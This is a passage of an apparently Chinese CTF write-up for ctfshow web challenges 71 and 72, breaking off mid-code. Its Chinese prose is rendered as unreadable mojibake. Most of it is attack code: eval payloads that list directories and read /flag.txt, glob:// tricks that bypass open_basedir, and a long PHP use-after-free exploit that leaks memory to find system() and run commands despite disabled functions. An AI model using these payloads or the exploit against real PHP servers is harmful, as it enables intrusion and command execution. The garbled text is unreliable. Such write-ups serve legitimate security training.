æ¸…ç©ºç¼“å†²åŒºçš„å†…å®¹å¹¶å…³é—­</p><p>é‚£ä¹ˆæ•´ä¸ªæµç¨‹å°±æ˜¯è·å–ç¼“å†²åŒºçš„æ•°æ®ç„¶åæ¸…ç©ºï¼Œå†æŠŠæ‰€æœ‰çš„å†…å®¹éƒ½æ›¿æ¢æˆ <code>?</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯åœ¨æ›¿æ¢ä¹‹å‰æŠŠå†…å®¹åŠ«æŒäº†</p><p>åˆ©ç”¨ <code>die()</code> å‡½æ•°å’Œ <code>exit()</code> å‡½æ•°éƒ½èƒ½æå‰ç»ˆæ­¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&quot;/&quot;));die();<br>c=include(&#x27;/flag.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web72"><a href="#Web72" class="headerlink" title="Web72*"></a>Web72*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>ini_set(&#x27;display_errors&#x27;, 0);<br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>        $s = ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br><br>ä½ è¦ä¸Šå¤©å—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>åˆ—å‡ºç›®å½•æ–‡ä»¶æ—¶å›æ˜¾æ²¡æœ‰æƒé™</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-literal">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-literal">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-literal">Warning</span>: scandir(): open_basedir restriction <span class="hljs-keyword">in</span> effect. <span class="hljs-keyword">File</span>(/) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> within the allowed path(s): (/var/www/html/) <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><br><span class="hljs-literal">Warning</span>: scandir(/): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> dir: Operation <span class="hljs-keyword">not</span> permitted <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><br><span class="hljs-literal">Warning</span>: scandir(): (errno <span class="hljs-number">1</span>): Operation <span class="hljs-keyword">not</span> permitted <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><code>open_basedir</code> ï¼š<a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/">open_basedirç»•è¿‡</a></p><p>ä½¿ç”¨ <code>glob://</code> ä¼ªåè®®ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&#x27;glob://*&#x27;));exit();#åˆ—å‡º open_basedir å…è®¸çš„ç›®å½•<br>c=var_export(scandir(&#x27;glob:///*&#x27;));die();#åˆ—å‡ºæ ¹ç›®å½•<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ä¸èƒ½è¯»å–æ–‡ä»¶ï¼Œçœ‹äº†å¾ˆå¤šå¤§ä½¬çš„ WP</p><p>åˆ©ç”¨ uaf ç»•è¿‡ <code>open_basedir</code> æ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span 